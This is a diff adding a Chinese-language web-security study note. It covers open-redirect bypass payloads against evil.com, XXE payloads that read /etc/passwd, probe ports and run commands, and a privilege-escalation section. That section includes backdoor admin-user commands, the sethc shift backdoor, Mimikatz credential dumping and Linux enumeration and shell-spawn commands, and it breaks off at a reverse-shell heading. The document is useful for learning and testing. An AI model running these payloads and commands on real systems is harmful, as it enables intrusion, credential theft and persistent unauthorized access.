@@ -2515,62 +2515,1014 @@ Web Storage也收到同源策略的约束，每个域所拥有的信息只会保
 
 HTML5是互联网未来的大势所趋，虽然目前距离全面普及还有很长的路要走，但随着浏览器开始支持越来越多的HTML5功能攻击面也随之产生了新的变化，攻击者有可能利用HTML5的特性，来绕过未及时更新的防御方案，要对抗这些新型的攻击，就必须了解HTML5的方方面面，对与HTML5来说，在移动互联网的普及进程可能会快一些，因此未来HTML5攻防的主战场，很可能会发生在移动互联网上
 
+### <font color="yellow">07 URL跳转漏洞</font>
 
+借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题，即黑客构建恶意链接(链接需要进行伪装,尽可能迷惑)，发在QQ群或者是浏览量多的贴吧/论坛中
 
+对抗手法
 
+> Referer限制，确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接，加入有效性验证Token，保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制
 
+#### <font color="yellow">001 漏洞场景</font>
 
+URL跳转漏洞的出现场景还是很杂的，出现漏洞的原因主要有以下5个
 
+- 写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞
+- 写代码时考虑不周，用取子串、取后缀等方法简单判断，代码逻辑可被绕过
+- 对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过
+- 原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性，可被绕过
+- 原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过
 
+在没有分清楚具体场景时，一味的堆积姿势常常是费力不讨好
 
+总结完常见的漏洞场景，就可以根据总结情况，写个脚本，生成所有可能的payload，再放到工具(如burpsuite)里批量尝试，既省事，又不会人为遗漏
 
+由于不同语言对HTTP协议的实现和跳转函数的实现不一致，所以可能会出现对某种语言或框架特定的利用方式
 
+漏洞通常发生在以下几个地方
 
+- 用户登录、统一身份认证处，认证完后会跳转
+- 用户分享、收藏内容过后，会跳转
+- 跨站点认证、授权后，会跳转
+- 站内点击其它网址链接时，会跳转
 
+常见的参数名
 
+- redirect
+- redirect_to
+- redirect_url
+- url
+- jump
+- jump_to
+- target
+- to
+- link
+- linkto
+- domain
 
+几种语句和框架版本常见的URL跳转代码如下，可用作白盒代码审计参考
+- Java
 
+```java
+response.sendRedirect(request.getParameter("url"));
+```
 
+- php
 
+```php
+$redirect_url = $_GET['url'];
+header("Location: " . $redirect_url);
+```
 
+- .NET
 
+```c#
+string redirect_url = request.QueryString["url"];
+Response.Redirect(redirect_url);
+```
 
+- Django
 
+```python
+redirect_url = request.GET.get("url")
+HttpResponseRedirect(redirect_url)
+```
 
+- Flask
 
+```python
+redirect_url = request.form['url']
+redirect(redirect_url)
+```
 
+- Rails
 
+```ruby
+redirect_to params[:url]
+```
 
+#### <font color="yellow">002 利用方法</font>
 
+后面假设源域名为：`www.landgrey.me`要跳转过去的域为：`evil.com`
 
+##### <font color="yellow">0001 直接跳转</font>
 
+没做任何限制，参数后直接跟要跳转过去的网址就行`https://www.landgrey.me/redirect.php?url=http://www.evil.com/untrust.html`
 
+##### <font color="yellow">0002 协议一致性</font>
 
+当程序员校验跳转的网址协议必须为https时(有时候跳转不过去不会给提示)`https://www.landgrey.me/redirect.php?url=https://www.evil.com/untrust.html`
 
+##### <font color="yellow">0003 域名字符串检测欺骗</font>
 
+-  有的程序员会检测当前的域名字符串是否在要跳转过去的字符串中，是子字符串时才会跳转，php代码
 
+```php
+<?php
+$redirect_url = $_GET['url'];
+if(strstr($redirect_url,"www.landgrey.me") !== false)
+{
+    header("Location: " . $redirect_url);
+}
+else
+{
+    die("Forbidden");
+}
+```
 
+绕过
 
+`https://www.landgrey.me/redirect.php?`
+`url=http://www.landgrey.me.www.evil.com/untrust.html`
 
+- 还有的会检测域名结尾是不是当前域名，是的话才会跳转，Django示例代码如下
 
+```python
+redirect_url = request.GET.get("url")
+if redirect_url.endswith('landgrey.me'):
+    HttpResponseRedirect(redirect_url)
+else:
+		HttpResponseRedirect("https://www.landgrey.me")
+```
 
+绕过
 
+`https://www.landgrey.me/redirect.php?url=http://www.evil.com/www.landgrey.me`
 
+买个xxxlandgrey.me域名，然后绕过
 
+`https://www.landgrey.me/redirect.php?url=http://xxxlandgrey.me`
 
+- 可信站多次重定向绕过
+利用已知可重定向到自己域名的可信站点的重定向，来最终重定向自己控制的站点
 
+一种是利用程序自己的公共白名单可信站点，如www.baidu.com，其中百度有个搜索的缓存链接比如`https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG`，可以最终跳转到自己网站，然后测试时
 
+`https://www.landgrey.me/redirect.php?`
 
+`url=https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG`
 
+就可以跳转到自己站点了
 
+另一种类似，但是程序的跳转白名单比较严格，只能是自己域的地址，这时需要有一个目标其它域的任意跳转漏洞，比如`https://auth.landgrey.me/jump.do?url=evil.com`，然后测试时
 
+`https://www.landgrey.me/redirect.php?url=https://auth.landgrey.me/jump.do?url=evil.com`
 
+- 畸形地址绕过
 
+这一部分由于各种语言、框架和代码实现的不同，防护任意跳转代码的多种多样，导致绕过方式乍看起来很诡异，有多诡异
 
+10种bypass方式
 
+- 单斜线"/"绕过
 
+`https://www.landgrey.me/redirect.php?url=/www.evil.com`
 
+- 缺少协议绕过
 
+`https://www.landgrey.me/redirect.php?url=//www.evil.com`
+
+- 多斜线"/"前缀绕过
+
+`https://www.landgrey.me/redirect.php?url=///www.evil.com`
+
+`https://www.landgrey.me/redirect.php?url=www.evil.com`
+
+- 利用"@"符号绕过
+
+`https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com`
+
+- 利用反斜线"\"绕过
+
+`https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me`
+
+- 利用"#"符号绕过
+
+`https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me`
+
+- 利用"?"号绕过
+
+`https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me`
+
+- 利用"\\"绕过
+
+`https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me`
+
+- 利用"."绕过
+
+`https://www.landgrey.me/redirect.php?url=.evil(可能会跳转到www.landgrey.me.evil域名)`
+
+`https://www.landgrey.me/redirect.php?url=.evil.com(可能会跳转到evil.com域名)`
+
+- 重复特殊字符绕过
+
+`https://www.landgrey.me/redirect.php?url=///www.evil.com//..`
+
+`https://www.landgrey.me/redirect.php?url=www.evil.com//..`
+
+#### <font color="yellow">003 防御方法</font>
+
+- 代码固定跳转地址，不让用户控制变量
+- 跳转目标地址采用白名单映射机制，比如1代表auth.landgrey.me，2代表www.landgrey.me，其它不做任何动作
+- 合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转
+
+### <font color="yellow">08 0day漏洞</font>
+
+#### <font color="yellow">001 简介</font>
+
+通常是指还没有补丁的漏洞，也就是说官方还没有发现或者是发现了还没有开发出安全补丁的漏洞，利用0day漏洞进行的攻击，特点是利用简单，危害较大
+
+#### <font color="yellow">002 常见0day——struts2</font>
+
+Struts2框架存在漏洞，平时说的存在struts2漏洞是指的远程命令/代码执行漏洞
+
+Struts2漏洞有很多，比较著名的几个远程命令/代码执行漏洞
+- S2-016
+
+	影响范围：Struts 2.0.0 - Struts 2.3.15
+
+- S2-032
+
+	影响范围：Struts 2.3.20 - Struts Struts 2.3.28(except 2.3.20.3 and 2.3.24.3)
+
+- S2-037
+
+	影响范围：Struts 2.3.20 - Struts Struts 2.3.28.1
+
+- S2-045
+
+	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10
+
+- S2-046
+
+	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10
+
+- S2-048
+
+	影响范围：Struts 2.3.x with Struts 1 plugin and Struts 1 action
+
+	危害：可获取服务器权限
+
+利用该漏洞可执行任意操作，例如上传shell，添加管理员账号等，下图我们展示的是查询os版本信息，以证明漏洞存在
+
+#### <font color="yellow">003 常见0day——Java反序列化</font>
+
+-  Java序列化：把Java对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的writeObject()方法可以实现序列化
+-  Java反序列化：把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化
+-  影响范围：WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，都收到影响
+-  危害：导致远程代码执行，获取服务器权限
+
+直接部署一个webshell，利用非常简单
+
+#### <font color="yellow">004 常见的0day——bash破壳漏洞</font>
+
+- Bash漏洞：bash漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量，由于没有对输入的环境变量进行检测，攻击者可以在输入变量的时候可以包含恶意代码，在shell被调用后会被立即执行
+- 影响范围：影响目前主流的操作系统平台，包括但不限于Redhat、CentOS、Ubuntu、Debian、Fedora、Amazon Linux、OS X 10.10等平台
+- 危害：黑客利用该漏洞，可以执行任意代码，甚至可以不需要经过认证，就能远程取得系统的控制权，包括执行恶意程序，或在系统内植入木马，或获取敏感信息
+
+#### <font color="yellow">005 常见的0day——心脏滴血漏洞</font>
+
+- 心脏滴血漏洞(OpenSSL心脏滴血漏洞)：未能正确检测用户输入参数的长度，攻击者可以利用该漏洞，远程读取存在漏洞版本的OpenSSL服务器内存中64K的数据，获取内存中的用户名、密码、个人相关信息以及服务器的证书等私密信息
+- 影响范围：该漏洞纰漏时，约有17%(大约五十万)通过认证机构认证的互联网安全网络服务器容易受到攻击
+- 危害：通过多个测试实例表明，根据对应OpenSSL服务器承载业务类型，攻击者一般可获得用户X.509证书私钥、实时连接的用户账号密码、会话Cookie等敏感信息，进一步可直接取得相关用户权限，窃取私密数据或执行非授权操作
+
+#### <font color="yellow">006 常见的0day——永恒之蓝</font>
+- 永恒之蓝(EternalBlue)：美国国家安全局(NSA)开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄露，Wannacry传播利用的是windows的smb漏洞，漏洞补丁是MS17-010
+- 影响范围：大多数Windows系统都受到影响(已有相关补丁)
+- 危害：获取服务器权限
+
+#### <font color="yellow">007 常见的0day——samba漏洞</font>
+
+- Linux版永恒之蓝，CVE-2017-7494
+- 差异：Windows的SMB服务器默认开启，Samba在大多数的Linux发行版中需要手动开启
+- 影响范围：漏洞影响Samba3.5.0及3.5.0和4.6.4之间的任意版本(不包括4.5.10、4.4.14、4.6.4)
+- 危害：可直接获取服务器shell
+
+#### <font color="yellow">008 常见的0day——dedecms</font>
+
+- Dedecms，织梦内容管理系统
+- recommend.php存在sql注入
+- 利用EXP
+- 危害：上述exp可获取管理员密码
+
+#### <font color="yellow">009 常见的0day——phpcms</font>
+
+- phpcms,PHPCMS V9内容管理系统
+- Authkey泄露、17年最新getshell 0day
+- Authkey泄露利用EXP
+- 危害：若存在该漏洞，访问上述链接authkey会泄露，可利用authkey进行注入
+
+### <font color="yellow">09 XXE漏洞</font>
+
+XXE漏洞全称(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害
+
+XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件
+
+XML(EXtensible Markup Language，可扩展标记语言)用来结构化、存储以及传输信息
+
+XML文档结构包括3部分
+
+- XML声明
+- 文档类型定义(可选)
+- 文档元素
+  
+```xml
+<!-- XML声明(定义了XML的版本和编码) -->
+	<?xml version="1.0" encoding="ISO-8859-1"?>
+
+	<!-- 文档类型定义 -->
+	<!DOCTYPE note [
+		<!ELEMENT note (to,from,heading,body)>
+		<!ELEMENT to      (#PCDATA)>
+		<!ELEMENT from    (#PCDATA)>
+		<!ELEMENT heading (#PCDATA)>
+		<!ELEMENT body    (#PCDATA)>
+	]>
+	<!-- 文档元素 -->
+	<note>
+		<to>George</to>
+		<from>John</from>
+		<heading>Reminder</heading>
+		<body>Don't forget the meeting!</body>
+	</note>
+```
+
+#### <font color="yellow">001 View Code</font>
+
+XML声明
+
+> xml声明以`<?`开头，以`?>`结束
+> 
+> version属性是必选的，它定义了XML版本
+> 
+> encoding属性是可选的，它定义了XML进行解码时所用的字符集
+> 
+> ```xml
+> <?xml version="1.0" encoding="ISO-8859-1"?>
+> ```
+
+文档类型定义
+
+> 文档类型定义(Document Type Definition，DTD)用来约束一个XML文档的书写规范
+> 
+> 文档类型定义的基础语法
+> 
+> `<!ELEMENT 元素名 类型>`
+> 
+> 内部定义
+> 
+> 将文档类型定义放在XML文档中，称为内部定义，内部定义的格式如下
+> 
+> `<!DOCTYPE 根元素 [元素声明]>`
+> 
+> eg.
+> 
+> ```xml
+> <!DOCTYPE note [
+> 	<!-- 定义此文档是note类型 -->
+> 	<!ELEMENT note (to,from,heading,body)>
+> 	<!-- 定义note有4个元素:to from heading body -->
+>  	<!ELEMENT to      (#PCDATA)>
+> 	<!-- 定义to元素为#PCDATA类型  -->
+>  	<!ELEMENT from    (#PCDATA)>
+> 	<!-- 定义from元素为#PCDATA类型 -->
+>  	<!ELEMENT heading (#PCDATA)> 
+> 	<!-- 定义heading元素为#PCDATA类型 -->
+>  	<!ELEMENT body    (#PCDATA)>
+> 	<!-- 定义body元素为#PCDATA类型 -->
+> ]>
+> ```
+
+外部文档引用
+
+> 文档类型定义的内容也可以保存为单独的DTD文档
+> 
+> DTD文档在本地格式
+> 
+> ```xml
+> <!DOCTYPE 根元素 SYSTEM "文件名">
+> <!--eg：<!DOCTYPE note SYSTEM "note.dtd">-->
+> ```
+> 
+> DTD文档外网引用
+> 
+> ```xml
+> <!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">
+> <!--eg：<!doctype html public "xxx" "http://www.xx.com/note.dtd">-->
+> ```
+
+#### <font color="yellow">002 漏洞代码</font>
+
+`file_get_contents`函数读取了`php://input`传入的数据，但是传入的数据没有经过任何过滤，直接在loadXML函数中进行了调用并通过了echo函数输入`$username`的结果，这样就导致了XXE漏洞的产生
+
+```php
+<?php 
+libxml_disable_entity_loader(false);
+$xmlfile=file_get_contents('php://input');
+$dom=new DOMDocument();
+
+$dom->loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD);
+$creds=simplexml_import_dom($dom);
+$username=$creds->username;
+$password=$creds->password;
+echo 'hello'.$username;
+?>
+```
+
+#### <font color="yellow">003 文件读取</font>
+
+通过加载外部实体，利用file://、php://等伪协议读取本地文件
+
+payload
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE creds[
+<!ELEMENT userename ANY>
+<!ELEMENT password ANY>
+<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
+<creds>
+    <username>&xxe</username>
+    <password>test</password>
+</creds>
+```
+
+#### <font color="yellow">004 内网探测</font>
+
+利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢
+
+探测22号端口是否开启
+
+payload
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE creds[
+<!ELEMENT userename ANY>
+<!ELEMENT password ANY>
+<!ENTITY xxe SYSTEM="http://127.0.0.1.22"]>
+<creds>
+    <username>&xxe</username>
+    <password>test</password>
+</creds>
+```
+
+#### <font color="yellow">005 内网应用攻击</font>
+
+通过XXE漏洞进行内网应用攻击，例如攻击内网jmx控制台未授权访问的JBpss漏洞进行攻击
+
+#### <font color="yellow">006 命令执行</font>
+
+利用xxe漏洞可以调用except://伪协议调用系统命令
+
+payload
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE creds[
+<!ELEMENT userename ANY>
+<!ELEMENT password ANY>
+<!ENTITY xxe SYSTEM="except://id"]>
+<creds>
+    <username>&xxe</username>
+    <password>test</password>
+</creds>
+```
+
+#### <font color="yellow">007 漏洞修补</font>
+
+禁用外部实体：在代码中设置`libxml_disable_entity_loader(true)`
+
+过滤用户提交的XML数据：过滤关键词为`<!DOCTYPE`、`<!ENTITY`、`SYSTEM`和`PUBLIC`
+
+#### <font color="yellow">008 简介</font>
+
+XML外部实体注入(XML External Entity)简称XXE漏洞
+
+简介
+
+- XML指可扩展标记语言(EXtensible Markup Language)
+- XML是一种很像HTML的标记语言
+- XML的设计宗旨是传输数据，而不是显示数据
+- XML标签没有被预定义，您需要自行定义标签
+- XML被设计为具有自我描述性
+- XML是W3C的推荐标准
+
+XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则，文档类型定义(DTD)可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构，DTD可被成行地声明于XML文档中，也可作为一个外部引用
+
+内部的DOCTYPE声明：`<!DOCTYPE root-element [element-declarations]>`
+
+外部文档声明：`<!DOCTYPE root-element SYSTEM "filename">`
+
+在DTD中进行实体声明的时候，将使用ENTITY关键字来声明，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明
+
+内部实体声明：`<!ENTITY entity-name "entity-value">`
+
+外部实体声明：`<!ENTITY entity-name SYSTEM "URI/URL">`
+
+XXE漏洞代码分析
+
+### <font color="yellow">10 提权</font>
+
+#### <font color="yellow">001 Web服务器提权</font>
+
+- SER-TU提权：通常是利用SERFTP服务器管理工具，首先要在安装目录下找到INI配置文件，必须具备可写入的权限
+- RADMIN提权：在扫描4899空口令后，同样需要他来连接
+- PCANYWHRER提权：也是远程客户端软件，下载安装目录的CIF文件进行破解
+- SAM提权：SAM系统帐户，通常需要下载临时存放的SAM文件，然后进行HASH破解
+- NC提权：利用NC命令，反弹一个端口，然后TELNET远程去连接一个端口，虽然权限不够大，但结合巴西烤肉，也是能够成功的
+- PR提权：PR提权，这个就不多说了，最好是免杀的PR大杀器，这样更方面我们去操作
+- IIS提权：IIS6.0提权，首先需要获取IIS的配置信息，利用工具进行添加后门用户
+- 43958提权：如果SER-TU有直接读入和执行的权限，那么我们就可以直接提权
+- PERL提权：PERL提权通常是针对PERL文件夹下的提权方式，利用DIR目录%20NET USER这样来建立后门用户
+- 内网LCX提权：转发工具LCX，通常需要先本地监听一个端口，然后转发，针对内网，用本地的127连接对方的3389
+- 启动提权：如果服务器启动项有能够执行的权限，那么应该说管理员的技术肯定不精湛
+- 替换服务提权：替换某个服务EXE，比如SER-TU，可将原有的删除，再传一个同样的SER.EXE上去，等待服务器重启
+- FXP提权：FXP这个工具其实本身他是一个传输工具，但我们可以下载他的三个文件，然后，用密码查看器的功能去获得密码
+- 输入法提权：目前来说的话，输入法提权的思路基本上不太可行了
+- 360提权：360提权，也就是我们常说的SHIFT后门，如果执行了360漏洞利用程序，连接服务器用SHIFT5下，弹出了CMDSHELL即为成功
+- VNC提权：VNC，我们通常是扫描5900国外服务器时候用到VNC来连接的，同样，我们如果得到了VNC的密码，通常可以利用他来提权
+- 2003ODAY提权：如果服务器是2003的，那么就可以利用2003ODAY利用工具来进行提权了
+- ROOT提权：如果你获得了MSSQL的密码，那么就可以导入注册表的方式，利用MSSQL语句执行我们想要的命令了
+- SA密码服务器提权：通常去寻找SA，MSSQL的相关密码，比如CONFIG.ASP,CONN.ASP等等
+- FTP溢出提权：这个用到LCX工具，本地溢出，转发一个端口，虽然不是内网，利用默认的21进行提升权限
+
+#### <font color="yellow">002 简介</font>
+
+主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升webshell权限来拿到该服务器的权限
+
+常见脚本所处的权限
+
+- asp/PHP，匿名权限(网络服务权限，权限较小)
+- aspx，user权限(普通用户权限)
+- jsp，系统权限(通常)
+
+收集信息
+
+- 必要信息
+	内/外网
+	服务器系统和版本位数
+	服务器的补丁情况
+	服务器的安装软件情况
+	服务器的防护软件情况
+	端口情况
+	支持脚本的情况
+- 常见命令(for windows)
+	- ipconfig /all：查看当前ip
+	- net user：查看当前服务器账号情况
+	- netstat –ano：查看当前服务器端口开放情况
+	- ver：查看当前服务器操作糸统
+	- systeminfo：查看当前服务器配置信息(补丁情况)
+	- tasklist /svc：查看当前服务器进程
+	- taskkill –PID ID号：结束某个pid号的进程
+	- taskkill lim qq.exe /f：结束qq进程
+	- net user abc abc /add：添加一个用户名为abc密码为abc的用户
+	- whoami：查看当前操作用户(当前权限)
+- 常见命令(for linux)
+    - ls –al：查看当前服务器的文件和文件夹
+	- pwd：查看当前操作路径
+	- uname -a：查看当前服务器的内核信息
+- cmd执行命令
+	- 防护软件拦截
+	- cmd被降权
+	- 组件被删除
+	
+	找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用
+
+#### <font color="yellow">003 windows提权</font>
+
+- 第三方软件提权
+	- FTP软件
+		- server –u、g6ftp、FileZilla
+	- 远程管理软件
+		- PCanywhere、readmin、vnc
+- 溢出提权
+	- server-u提权
+		- 有修改权限
+			- 检查是否有可写权限，修改server-u，默认安装目录下的servUDaemou.ini
+			- 增加用户
+			- 连接
+			- 执行命令
+			
+			quote site exec bet user abc abc.com /add
+			
+			quote site exec net localgroup administertors abc /add
+		
+		- 无修改权限
+			- 暴力破解mds
+			- 溢出提权
+- 启动项提权
+
+	G6ftp提权
+	- 下载管理配置文件，将administrator管理密码破解
+	- 使用lcx端口转发(默认只允许本机连接)
+	- lcx.exe –tran 8027 127.0.0.1 8021
+	- 使用客户端管理员用户登录
+	- 创建用户并设置权限和执行的批处理文件
+	- 上传批处理
+	- 已创建的普通用户登录ftp
+	- 执行命令quate site x.bat
+	- x.bat内容为添加系统用户提权
+
+- 破解hash提权
+	- filezilla提权：filezilla是一款开源的ftp服务器和客户端的软件若安装了服务器默认只监听127.0.0.1的14147端口并且默认安装目录下有两个敏感文件
+		- filezillaserver.xm(包含了用户信息)
+		- filezillaserver interface.xml(包含了管理信息)
+		
+		提权思路
+		
+		- 下载这两个文件，拿到管理密码
+		- 配置端口转发，登录远程管理ftpserver创建ftp用户
+		- 分配权限，设置家目录为c:\
+		- 使用cmd.exe改名为sethc.exe替换
+		- c:\windows\system32\sethc.exe生成shift后门
+		- 连接3389按5次shift调出cmd.exe
+		- query user(显示管理员是否在线)
+- 数据库提权
+
+#### <font color="yellow">004 服务器系统提权意义</font>
+
+- 修改服务器上某个文件
+- 查看服务器上某个文件
+- 获取服务器上数据库权限
+
+网站webshell权限解析
+
+<font color="red">一般情况下，webshell权限介于guests-users之间，权限较小</font>
+
+webshell权限影响条件
+
+- 网站脚本类型
+- 搭建平台类型
+- 当拿到一个网站时，看看它的脚本类型
+
+`ASP PHP(小于users)<ASPX(users) <JSPs`(ystem，如果网站是JSP搭建，权限就是system了，也就是不用提权了)
+
+`phpstudy apmserv lamp 等软件搭建 = administrators`
+
+常规提权的方法
+
+- 数据库提权
+- 溢出漏洞提权
+- 第三方软件提权
+
+#### <font color="yellow">005 服务器提权系统溢出漏洞</font>
+
+前期的信息收集
+
+- 服务器操作系统的位数
+- 网站脚本程序类型
+- 服务器补丁情况
+- 服务器防护软件
+- 其他信息整理
+
+常见的系统命令(for windows)
+
+- ipconfig：查看计算机ip地址(判定网络情况，是否是内网还是外网)
+- net user：查看计算机用户
+- net start：查看计算机开启服务(可以看一下是否开启防护软件)
+- whoami：查看当前用户权限
+- tasklist /svc：查看计算机进程(判断第三方软件等)
+- systeminfo：查看计算机相关信息(操作系统、位数、补丁情况等)
+- netstat -ano：查看计算机端口开放情况
+
+#### <font color="yellow">006 对提权的重新记录</font>
+
+信息收集
+
+- 内网
+- 服务器系统和版本位数
+- 服务器的补丁情况
+- 服务器的安装软件情况
+- 服务器的防护软件情况
+- 端口情况
+- 支持脚本的情况
+
+常见命令(for windows)
+
+- ipconfig /all：查看当前ip
+- net user：查看当前服务器账号情况
+- netstat –ano：查看当前服务器端口开放情况
+- ver：查看当前服务器操作糸统
+- systeminfo：查看当前服务器配置信息(补丁情况)
+- tasklist /svc：查看当前服务器进程
+- taskkill –PID ID号：结束某个pid号的进程
+- taskkill lim qq.exe /f：结束qq进程
+- net user abc abc /add：添加一个用户名为abc密码为abc的用户
+- whoami：查看当前操作用户(当前权限)
+
+常见命令(for linux)
+
+- ls –al：查看当前服务器的文件和文件夹
+- pwd：查看当前操作路径
+- uname -a：查看当前服务器的内核信息
+
+cmd执行命令
+
+- 防护软件拦截
+- cmd被降权
+- 组件被删除
+
+找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用
+
+#### <font color="yellow">007 提权的条件</font>
+
+如在拿到webshell权限、数据库权限、普通用户权限
+
+Windows基础命令
+
+- query user：查看用户登录情况
+- whoami：查看当前用户权限
+- systeminfo：查看当前系统版本和补丁信息
+
+添加管理员用户–设置密码为`123456`
+
+`net user 1111 123456 /add`
+
+`net localgroup administrators 1111 /add`
+
+如果远程桌面连接不上，那么就添加远程桌面组
+
+`net localgroup "Remote Desktop Users" 1111 /add`
+
+其他基础命令
+- ipconfig：查看本机ip信息，可加/all参数
+- netstat-ano：查看端口情况
+- dir c:\：查看目录
+- type c:\...\...\....txt：查看指定位置文件内容，一般为文本文件
+- echo 字符串>....txt：写入文本到文件，特殊字符<>等前面加^
+- copy ....txt ....php：复制文件
+- renname d:\....txt ....txt：将某个路径下文件重命名
+- tasklist：查看所有进程占用的端口
+- taskkill /im ....exe /f：强制结束指定进程
+
+linux基础命令：本地溢出提权、数据库提权、三方软件提权、信息泄露
+
+#### <font color="yellow">008 基于密码破解的提权</font>
+
+密码获取的常用手段
+
+- 中间人劫持：网络窃听
+- 用户主机窃听：键盘记录
+- 简单猜测：常用密码(弱口令)
+- 系统漏洞：永恒之蓝
+- 用户泄露：git、配置文件等泄露
+- 系统后门：shift后门等等
+
+windows的密码原理
+	
+> windows采用两种方法对用户密码进行哈希处理，分别是LM和NT，而哈希是一种加密函数经过计算后的结果
+> 
+> windows系统密码hash默认情况下由两部分组成，第一部分是LM-hash，第二部分是NT-hash
+> 
+> 得到了哈希密码后可以通过在线查询网站来破解
+
+windows密码hash导出(获取)
+
+> 导出导入SAM、system
+> 
+> gethashs导出
+> 
+> Pwdump导出
+> 
+> Wce导出
+
+这四种方法都是用不同的工具去获取，基本差不多的
+
+破解hash密码：导入SAM和system文件(也可以导入 pwdump导出来的文件)进行暴力破解即可
+
+明文密码的获取
+
+> 工具
+> 
+> Wce明文密码获得
+> 
+> Mimikatz明文密码获得
+> 
+> - privllege::debug
+> - sekurlsa::logonpasswords
+> 
+> Getpass明文密码获得
+
+Linux密码获取和破解
+
+- join破解
+- 加载字典破解
+
+#### <font color="yellow">009 windows系统的提权基础(pr提权)</font>
+
+windows提权
+
+- 密码收集
+	- 注册表
+	- 日志
+	- .rap文件
+	- 内存
+	- 配置文件
+	- sam文件
+- 内核提权
+	- ms09-012(pr.exe)
+- 数据库提权
+	- mysql
+	- sql server
+- 应用提权
+	- ftp
+
+#### <font color="yellow">010 windows提权实践</font>
+
+- WinSysHelper-master(上传bat+txt文件，适用于2003之前的系统)
+- powershell
+
+这里首先了解学习一下powersell的知识，在win7虚拟机中开启powshell，并查看其版本(Get-Host或者`$PSVersionTable.PSVERSION`命令来查看)
+
+powershell脚本的文件名后缀是.PS1
+
+这里利用Sherlock来提权(Sherlock是一个在Windows下用于本地提权的PowerShell脚本，可以在GitHub上下载)
+
+#### <font color="yellow">011 Linux提权基础</font>
+
+##### <font color="yellow">0001 基础命令</font>
+- 获取系统信息
+	- cat /etc/issue：查看发行版
+	- cat /etc/*-release：查看发行版
+	- cat /proc/version
+	- uname -a：查看内核版本
+	- rpm -q kernel：红帽系统特有
+	- dmesg | grep Linux
+	- ls /boot | grep vmlinuz-
+	- lsb_release -a
+- 检查用户权限
+	- sudo -l
+	- cat /etc/sudoers
+	- whoami
+	
+	passwd文件中存储了用户，shadow文件中存储的是密码的hash，出于安全的考虑，passwd是全用户可读，root可写，而Shadow是仅root可读写的
+	
+	passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了(这样非root就看不到了)
+
+- 查看环境变量
+	
+	搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件
+	
+	- cat /etc/profile
+	- cat /etc/bashrc
+	- cat ~/.bash_profile
+	- cat ~/.bashrc
+	- cat ~/.bash_logout
+	- cat ~/.bash_history
+	- env
+	- set
+- 检查历史文件及命令
+	- cat ~/.*_history
+- 搜寻可被低权限用户使用的root权限程序
+	- crontab -l
+	- ls -alh /var/spool/cron
+	- ls -al /etc/ | grep cron
+	- ls -al /etc/cron*
+	- cat /etc/cron*
+	- cat /etc/at.allow
+	- cat /etc/at.deny
+	- cat /etc/cron.allow
+	- cat /etc/cron.deny
+	- cat /etc/crontab
+	- cat /etc/anacrontab
+	- cat /var/spool/cron/crontabs/root
+- 检查以root权限的进程是否存在漏洞
+	- ps aux | grep root
+	- ps -ef | grep root
+- 搜索纯文本凭据的文件
+	- grep -ir user *
+	- grep -ir pass *
+- 查找可写的配置文件
+	- find /etc/ -writable -type f 2>/dev/null
+- 查找suid权限的程序
+	- find / -user root -perm -4000 -print 2>/dev/null
+	- find / type f -perm -u=s 2>/dev/null
+- 可利用的脚本
+	- LinEnum 
+	- linuxprivchecker.py
+	- unix-privesc-check 
+- 获得交互shell
+	- python -c 'import pty;pty.spawn("/bin/bash")' 
+	- echo os.system('/bin/bash')
+	- /bin/sh -i
+
+##### <font color="yellow">0002 反弹shell实战</font>
+
+Bash反弹shell
+
+> Linux 反弹 shell 使用下面这条命令，该命令弹回来的shell是不可交互的，也就是比如 vim、passwd 命令不能用
+>
+> ```bash
